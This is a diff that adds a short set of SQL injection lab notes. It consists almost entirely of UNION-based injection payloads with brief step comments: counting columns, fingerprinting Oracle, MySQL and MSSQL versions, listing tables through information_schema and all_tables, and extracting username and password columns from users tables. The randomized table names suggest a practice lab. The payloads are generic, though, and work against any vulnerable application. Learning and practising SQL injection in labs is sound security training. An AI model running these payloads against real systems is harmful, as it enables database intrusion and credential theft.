@@ -1,0 +1,50 @@
+STEPS:
+
+1. Get column count
+' UNION SELECT NULL, --
+
+# This is the lab solution. It has 3 columns!
+'+UNION+SELECT+NULL,NULL,NULL--
+
+# Oracle dabase using DUAL 
+'UNION SELECT version FROM v$instance--
+
+2. Find column containing text
+' UNION SELECT NULL,'a',NULL--
+
+# Example: Retrieving data from other tables
+' UNION SELECT username,password FROM users--
+
+# Example 2: Retrieving multiple values in a single column (using concatination)
+' UNION SELECT NULL,CONCAT(username,' - ',password) FROM users--
+
+3. Examining database
+
+# Querying database type and version on Oracle
+' UNION SELECT NULL,banner FROM v$version--
+
+# Querying database type and version on MS and MySql
+' UNION SELECT NULL,@@version %23
+' UNION SELECT NULL,@@version-- -
+
+4. Listing database contents using 'information_schema.tables'
+# FOR NON-ORACLE ONLY
+' UNION SELECT TABLE_TYPE,TABLE_NAME FROM information_schema.tables--
+
+# Narrow down the result using 'user' keyword
+' UNION SELECT TABLE_TYPE, TABLE_NAME FROM information_schema.tables WHERE information_schema.tables.TABLE_NAME LIKE '%user%'--
+
+# Try to use the interesting table(actual database anme) from the results. Then get the column names
+' UNION SELECT 'a',COLUMN_NAME FROM information_schema.columns WHERE table_name='users_qcyxhv' --
+
+# Query the details from the tables
+'UNION SELECT username_dvgrgl,password_zrzyvz FROM users_qcyxhv--
+
+# FOR ORACLE ONLY using 'all_tables'
+' UNION SELECT OWNER,TABLE_NAME FROM all_tables--
+' UNION SELECT 'a',column_name FROM all_tab_columns WHERE table_name ='USERS_DWFIMA'--
+' UNION SELECT USERNAME_YZGFNK,PASSWORD_HYDGTS FROM USERS_DWFIMA--
+
+
+
+
